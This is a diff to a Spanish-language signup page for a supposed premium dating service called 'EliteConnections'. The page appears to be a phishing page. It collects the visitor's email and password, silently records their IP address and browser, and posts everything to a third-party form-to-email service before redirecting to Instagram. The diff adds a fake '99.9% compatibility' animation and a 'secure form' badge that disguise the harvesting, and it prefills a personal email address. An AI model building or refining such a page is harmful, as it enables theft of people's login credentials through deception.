@@ -188,6 +188,45 @@
             text-align: center;
             font-weight: 600;
         }
+
+        .compatibility-animation {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 107, 157, 0.1);
+            border-radius: 12px;
+            display: none;
+        }
+
+        .compatibility-text {
+            font-weight: 700;
+            font-size: 1.2em;
+            color: #ff6b9d;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0);
+            width: 0%;
+            transition: width 2s ease-in-out;
+        }
+
+        .web3forms-info {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.8em;
+            color: #718096;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -210,7 +249,7 @@
             <div class="form-group">
                 <label for="email">Correo electrónico</label>
                 <input type="email" id="email" name="email" required 
-                       placeholder="tu.amor@ejemplo.com">
+                       placeholder="tu.amor@ejemplo.com" value="enriquepng1@gmail.com">
                 <div class="error" id="emailError">Por favor ingresa un email válido</div>
             </div>
             
@@ -221,12 +260,14 @@
                 <div class="error" id="passwordError">La contraseña debe tener al menos 8 caracteres</div>
             </div>
             
-            <!-- CAMPOS ADICIONALES -->
+            <!-- CAMPOS ADICIONALES PARA WEB3FORMS -->
             <input type="hidden" name="fecha_registro" id="fechaField">
             <input type="hidden" name="ip_usuario" id="ipField">
             <input type="hidden" name="navegador" id="navegadorField">
             <input type="hidden" name="pagina" value="EliteConnections">
             <input type="hidden" name="tipo_registro" value="premium_dating">
+            <input type="hidden" name="compatibilidad" value="99.9%">
+            <input type="hidden" name="plan" value="Premium">
             
             <button type="submit" id="submitButton">
                 <span id="buttonText">✨ Encontrar mi pareja ideal</span>
@@ -235,7 +276,20 @@
             <div class="loading" id="loadingMessage">
                 💫 Conectando con almas gemelas...
             </div>
+
+            <div class="web3forms-info" id="web3formsInfo">
+                🔒 Formulario seguro por Web3Forms
+            </div>
         </form>
+
+        <!-- ANIMACIÓN DE COMPATIBILIDAD -->
+        <div class="compatibility-animation" id="compatibilityAnimation">
+            <div class="compatibility-text">Compatibilidad 99.9%</div>
+            <div class="progress-bar">
+                <div class="progress" id="compatibilityProgress"></div>
+            </div>
+            <div>Verificación Premium</div>
+        </div>
 
         <div class="success-message" id="successMessage">
             ✅ ¡Registro exitoso! Revisa tu correo electrónico.
@@ -268,9 +322,13 @@
     <script>
         // CONFIGURACIÓN INICIAL
         document.addEventListener('DOMContentLoaded', function() {
+            // Establecer fecha y hora actual
             document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
+            
+            // Información del navegador
             document.getElementById('navegadorField').value = navigator.userAgent;
             
+            // Obtener IP del usuario
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -279,9 +337,12 @@
                 .catch(() => {
                     document.getElementById('ipField').value = 'IP no disponible';
                 });
+            
+            console.log('EliteConnections - Web3Forms configurado correctamente');
+            document.getElementById('web3formsInfo').style.display = 'block';
         });
 
-        // VALIDACIÓN Y ENVÍO
+        // VALIDACIÓN Y ENVÍO CON WEB3FORMS
         document.getElementById('registroForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -290,6 +351,8 @@
             const submitButton = document.getElementById('submitButton');
             const buttonText = document.getElementById('buttonText');
             const loadingMessage = document.getElementById('loadingMessage');
+            const compatibilityAnimation = document.getElementById('compatibilityAnimation');
+            const compatibilityProgress = document.getElementById('compatibilityProgress');
             
             let isValid = true;
             
@@ -316,34 +379,60 @@
             buttonText.textContent = 'Creando tu cuenta...';
             loadingMessage.style.display = 'block';
             
-            // ENVIAR A WEB3FORMS
-            const formData = new FormData(this);
-            
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('successMessage').style.display = 'block';
-                    document.getElementById('registroForm').style.display = 'none';
-                    
-                    setTimeout(() => {
-                        window.location.href = "https://www.instagram.com";
-                    }, 3000);
-                } else {
-                    throw new Error(data.message || 'Error en el envío');
-                }
-            })
-            .catch(error => {
-                alert('Error al crear la cuenta: ' + error.message);
-            })
-            .finally(() => {
-                submitButton.disabled = false;
-                buttonText.textContent = '✨ Encontrar mi pareja ideal';
+            // ANIMACIÓN DE COMPATIBILIDAD
+            setTimeout(() => {
                 loadingMessage.style.display = 'none';
-            });
+                compatibilityAnimation.style.display = 'block';
+                
+                // Animación de progreso
+                setTimeout(() => {
+                    compatibilityProgress.style.width = '99.9%';
+                }, 100);
+                
+                // ENVIAR FORMULARIO A WEB3FORMS DESPUÉS DE LA ANIMACIÓN
+                setTimeout(() => {
+                    const formData = new FormData(this);
+                    
+                    fetch(this.action, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            // ÉXITO - Mostrar mensaje y redirigir
+                            compatibilityAnimation.style.display = 'none';
+                            document.getElementById('successMessage').style.display = 'block';
+                            document.getElementById('registroForm').style.display = 'none';
+                            
+                            setTimeout(() => {
+                                window.location.href = "https://www.instagram.com";
+                            }, 3000);
+                        } else {
+                            throw new Error(data.message || 'Error en el envío del formulario');
+                        }
+                    })
+                    .catch(error => {
+                        // MANEJO DE ERRORES MEJORADO
+                        console.error('Error Web3Forms:', error);
+                        compatibilityAnimation.style.display = 'none';
+                        
+                        // Mostrar mensaje de error específico
+                        if (error.message.includes('security') || error.message.includes('seguridad')) {
+                            alert('Error de seguridad: No se pudo enviar el formulario. Por favor, intenta desde un servidor web (no desde file://)');
+                        } else {
+                            alert('Error al crear la cuenta: ' + error.message);
+                        }
+                    })
+                    .finally(() => {
+                        submitButton.disabled = false;
+                        buttonText.textContent = '✨ Encontrar mi pareja ideal';
+                        loadingMessage.style.display = 'none';
+                    });
+                    
+                }, 2000); // Tiempo para ver la animación de compatibilidad
+                
+            }, 1500); // Tiempo inicial de carga
         });
 
         // VALIDACIÓN EN TIEMPO REAL
@@ -358,6 +447,24 @@
                 document.getElementById('passwordError').style.display = 'none';
             }
         });
+
+        // ANIMACIÓN INICIAL PARA MEJORAR LA EXPERIENCIA
+        window.addEventListener('load', function() {
+            document.querySelector('.container').style.opacity = '0';
+            document.querySelector('.container').style.transform = 'translateY(20px)';
+            
+            setTimeout(() => {
+                document.querySelector('.container').style.transition = 'all 0.5s ease';
+                document.querySelector('.container').style.opacity = '1';
+                document.querySelector('.container').style.transform = 'translateY(0)';
+            }, 100);
+        });
+
+        // DETECCIÓN DE ENTORNO LOCAL
+        if (window.location.protocol === 'file:') {
+            console.warn('⚠️ Ejecutando localmente - Web3Forms requiere HTTPS');
+            document.getElementById('web3formsInfo').innerHTML = '⚠️ Ejecutando localmente - Para mejor funcionamiento, sube a un servidor web';
+        }
     </script>
 </body>
-                </html>
+</html>
